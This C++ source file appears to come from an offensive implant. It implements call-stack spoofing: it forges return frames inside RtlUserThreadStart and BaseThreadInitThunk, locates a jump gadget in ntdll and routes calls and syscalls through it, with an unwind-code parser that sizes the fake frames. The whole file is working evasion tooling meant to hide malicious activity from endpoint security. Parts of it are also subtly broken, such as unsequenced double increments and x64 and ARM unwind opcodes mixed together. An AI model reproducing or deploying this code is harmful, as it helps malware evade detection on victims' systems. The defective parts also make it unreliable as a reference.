#include <General.hpp>

#define ALIGN_UP(x, align) (((x) + ((align) - 1)) & ~((align) - 1))
#define ALIGN_DOWN(x, align) ((x) & ~((align) - 1))

auto DECLFN Spoof::Call(
    _In_ UPTR Fnc, 
    _In_ UPTR Ssn, 
    _In_ UPTR Arg1,
    _In_ UPTR Arg2,
    _In_ UPTR Arg3,
    _In_ UPTR Arg4,
    _In_ UPTR Arg5,
    _In_ UPTR Arg6,
    _In_ UPTR Arg7,
    _In_ UPTR Arg8,
    _In_ UPTR Arg9,
    _In_ UPTR Arg10,
    _In_ UPTR Arg11,
    _In_ UPTR Arg12
) -> PVOID {
    G_INSTANCE

    Instance->Spf.First.Ptr  = (PVOID)( (UPTR)( Instance->Win32.RtlUserThreadStart ) + 0x21 );
    Instance->Spf.Second.Ptr = (PVOID)( (UPTR)( Instance->Win32.BaseThreadInitThunk ) + 0x14 );;

    Instance->Spf.First.Size  = Spoof::StackSizeWrapper( Instance->Spf.First.Ptr );
    Instance->Spf.Second.Size = Spoof::StackSizeWrapper( Instance->Spf.Second.Ptr );

    do {
        Instance->Spf.Gadget.Ptr  = FindGadget( (PVOID)Instance->Win32.Ntdll, 0x23 );
        Instance->Spf.Gadget.Size = Spoof::StackSizeWrapper( Instance->Spf.Gadget.Ptr );
    } while ( ! Instance->Spf.Gadget.Size );

    Instance->Spf.Ssn      = Ssn;
    Instance->Spf.ArgCount = 12;

    return SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, (UPTR)&Instance->Spf, Arg5, Arg6, Arg7, Arg8, Arg9, Arg10, Arg11, Arg12 );
}


auto DECLFN Spoof::StackSizeWrapper(
    _In_ PVOID RetAddress
) -> UPTR {
    G_INSTANCE

    if (!RetAddress) {
        return 0;
    }

    UPTR                 ImgBase    = 0;
    UNWIND_HISTORY_TABLE HistoryTbl = { 0 };
    
    RUNTIME_FUNCTION* RtmFunction = Instance->Win32.RtlLookupFunctionEntry(
        (UPTR)( RetAddress ), &ImgBase, &HistoryTbl
    );
    if ( ! RtmFunction ) {
        return 0x20;
    }

    return StackSize( (UPTR)RtmFunction, ImgBase );
}

auto DECLFN Spoof::StackSize(
    _In_ UPTR RtmFunction,
    _In_ UPTR ImgBase
) -> UPTR {
    STACK_FRAME Stack = { 0 };
    RUNTIME_FUNCTION* pFunc = reinterpret_cast<RUNTIME_FUNCTION*>( RtmFunction );
    
    if ( ! pFunc || ! ImgBase ) {
        return 0x30;
    }

    UNWIND_INFO* UwInfo = reinterpret_cast<UNWIND_INFO*>(pFunc->UnwindData + ImgBase);
    
    if ( UwInfo->Version < 1 || UwInfo->Version > 2 ) {
        return 0x30;
    }

    ULONG TotalSize = 0;
    ULONG CodeCount = UwInfo->CountOfCodes;
    UNWIND_CODE* UwCode = UwInfo->UnwindCode;

    for ( ULONG i = 0; i < CodeCount; ) {
        UBYTE UnwOp  = UwCode[i].UnwindOp;
        UBYTE OpInfo = UwCode[i].OpInfo;

        switch ( UnwOp ) {
            case UWOP_PUSH_NONVOL:
                TotalSize += 8;
                i++;
                break;

            case UWOP_ALLOC_LARGE:
                if ( OpInfo == 0 ) {
                    TotalSize += UwCode[++i].FrameOffset * 8;
                } else {
                    TotalSize += UwCode[++i].FrameOffset + 
                               (UwCode[++i].FrameOffset << 16);
                }
                i++;
                break;

            case UWOP_ALLOC_SMALL:
                TotalSize += ( OpInfo * 8 ) + 8;
                i++;
                break;

            case UWOP_SET_FPREG:
            case UWOP_SET_FP: 
                Stack.SetsFramePtr = TRUE;
                i++;
                break;

            case UWOP_SAVE_NONVOL:
            case UWOP_SAVE_NONVOL_BIG:
                i += 2;
                break;

            case UWOP_SAVE_XMM128:
            case UWOP_SAVE_XMM128BIG:
                i += 3;
                break;

            case UWOP_PUSH_MACH_FRAME:
                TotalSize += OpInfo ? sizeof(UPTR) : 0; 
                TotalSize += 6 * sizeof(UPTR); 
                i++;
                break;

            case UWOP_ALLOC_MEDIUM:
                TotalSize += ((OpInfo << 4) + 16);
                i++;
                break;

            case UWOP_SAVE_FPLR:
                TotalSize += 2 * sizeof(UPTR);
                i++;
                break;

            case UWOP_SAVE_REG:
            case UWOP_SAVE_REGX:
                i += 2;
                break;

            case UWOP_SAVE_REGP:
            case UWOP_SAVE_REGPX:
                i += 3;
                break;

            case UWOP_SAVE_LRPAIR:
                TotalSize += 2 * sizeof(UPTR);
                i += 2;
                break;

            case UWOP_SAVE_FREG:
            case UWOP_SAVE_FREGX:
                i += 2;
                break;

            case UWOP_SAVE_FREGP:
            case UWOP_SAVE_FREGPX:
                i += 3;
                break;

            case UWOP_ADD_FP:
                TotalSize += (OpInfo << 3);
                i++;
                break;

            // Operações ARM
            case UWOP_ALLOC_HUGE:
                TotalSize += UwCode[++i].FrameOffset + 
                            (UwCode[++i].FrameOffset << 16) +
                            (UwCode[++i].FrameOffset << 32);
                i++;
                break;

            case UWOP_SAVE_REG_MASK:
            case UWOP_WIDE_SAVE_REG_MASK:
                TotalSize += (__builtin_popcount(OpInfo) * sizeof(UPTR));
                i += 2;
                break;

            case UWOP_SAVE_REGS_R4R7LR:
                TotalSize += 5 * sizeof(UPTR);
                i++;
                break;

            case UWOP_WIDE_SAVE_REGS_R4R11LR:
                TotalSize += 9 * sizeof(UPTR);
                i++;
                break;

            case UWOP_SAVE_FREG_D8D15:
                TotalSize += 8 * sizeof(DWORD64);
                i++;
                break;

            case UWOP_SAVE_FREG_D0D15:
                TotalSize += 16 * sizeof(DWORD64);
                i++;
                break;

            case UWOP_SAVE_FREG_D16D31:
                TotalSize += 16 * sizeof(DWORD64);
                i++;
                break;

            case UWOP_NOP:
            case UWOP_WIDE_NOP:
            case UWOP_END:
            case UWOP_END_NOP:
            case UWOP_WIDE_END_NOP:
                i++;
                break;

            default:
                TotalSize += 0x20;
                i++;
                break;
        }
    }

    if ( UwInfo->Flags & UNW_FLAG_CHAININFO ) {
        ULONG ChainOffset = CodeCount;
        if ( ChainOffset & 1) ChainOffset++;

        RUNTIME_FUNCTION* ChainFunc = reinterpret_cast<RUNTIME_FUNCTION*>(
            &UwInfo->UnwindCode[ChainOffset]
        );
        
        TotalSize += StackSize((UPTR)ChainFunc, ImgBase);
    }

    TotalSize += sizeof(UPTR); 
    TotalSize  = ALIGN_UP( TotalSize, 16 ); 
    TotalSize += 0x20; 

    return min( TotalSize, 0x1000 ); 
}